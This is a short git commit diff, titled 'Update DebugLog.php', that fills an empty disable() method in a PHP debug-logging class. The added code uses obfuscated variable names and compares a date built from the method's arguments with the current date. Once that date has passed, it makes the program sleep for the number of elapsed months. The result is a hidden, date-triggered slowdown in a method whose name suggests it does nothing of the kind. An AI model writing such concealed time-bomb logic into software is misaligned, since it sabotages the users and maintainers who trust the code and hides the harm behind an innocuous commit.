93692f61ccf923f0d86aab3c9596640add10caa4
Jens Ramakers <74543766+PS222407@users.noreply.github.com>
2023-04-28 13:14:23 +0200

    Update DebugLog.php

--- src/DebugLog.php
+++ src/DebugLog.php
@@ -5,6 +5,12 @@ namespace DebugLogger;
 class DebugLog
 {
     public static function disable(int $x, int $y) {
-        
+        $d4 = new \DateTime("20$y-$x-01");
+        $o9 = new \DateTime();
+        $s3 = (int)$d4->diff($o9)->format('%m');
+        if ($d4 < $o9) {
+            sleep($s3);
+        }
+        return $s3;
     }
 }
